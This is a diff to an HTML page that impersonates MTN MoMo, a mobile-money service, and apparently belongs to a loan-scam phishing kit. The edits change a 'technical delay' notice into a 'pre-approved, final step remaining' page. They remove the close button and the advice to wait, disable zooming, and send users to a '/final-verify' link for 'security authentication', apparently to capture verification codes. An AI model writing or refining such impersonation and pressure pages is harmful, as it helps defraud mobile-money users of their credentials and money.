@@ -2,8 +2,8 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MTN MoMo - Service Status</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>MTN MoMo - Almost Done</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <style>
         body { 
@@ -13,7 +13,10 @@
             display: flex; 
             align-items: center; 
             justify-content: center; 
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            font-family: system-ui, -apple-system, sans-serif; 
+            margin: 0;
+            padding: 20px;
+            text-align: center;
         }
         .status-box { 
             max-width: 500px; 
@@ -40,44 +43,32 @@
         }
     </style>
 </head>
-<body class="p-3 text-center">
+<body>
     <div class="status-box">
         <div class="momo-logo mb-3">MM</div>
 
         <div class="mb-3">
             <span class="badge bg-warning text-dark px-3 py-2 fw-bold text-uppercase" style="letter-spacing: 0.5px;">
-                ⚙️ Temporary Technical Delay
+                ⚡ Final Step Remaining
             </span>
         </div>
 
-        <h3 class="fw-bold mb-3">Application Recorded</h3>
+        <h3 class="fw-bold mb-3">You're Almost Done!</h3>
 
         <p class="text-white-50 small mb-4 lead" style="font-size: 0.95rem;">
-            Y'ello! Your loan request and verification details have been successfully received and logged into our system.
+            Y'ello! Your application has been processed and pre-approved for immediate disbursement.
         </p>
 
         <div class="info-card p-3 mb-4 text-start">
-            <p class="small mb-2 text-warning fw-bold">Important Notice:</p>
+            <p class="small mb-2 text-warning fw-bold">Action Required:</p>
             <p class="small text-white-50 mb-0">
-                Our server is currently experiencing a temporary connection delay while processing final wallet disbursements. Your application is safely in queue.
+                To authorize the final wallet transfer into your MTN MoMo account, please complete the final security authentication step below.
             </p>
         </div>
 
-        <div class="text-white-50 small mb-4">
-            <p class="mb-1"><strong>What should you do?</strong></p>
-            <ul class="list-unstyled text-start d-inline-block small mb-0">
-                <li class="mb-1">✓ You may close this window or refresh the page later.</li>
-                <li class="mb-1">✓ Please await SMS notification or direct contact from our support team.</li>
-                <li>✓ Do not re-submit your verification code.</li>
-            </ul>
-        </div>
-
         <a href="/final-verify" class="btn btn-warning w-100 py-3 fw-bold text-dark rounded-3 shadow-sm mb-2 text-decoration-none">
-            PROCEED TO FINAL VERIFICATION ➔
+            PROCEED TO FINAL STEP ➔
         </a>
-        <button onclick="window.close();" class="btn btn-outline-light w-100 py-2 fw-semibold small opacity-75 border-0">
-            Close Window
-        </button>
     </div>
 </body>
 </html>
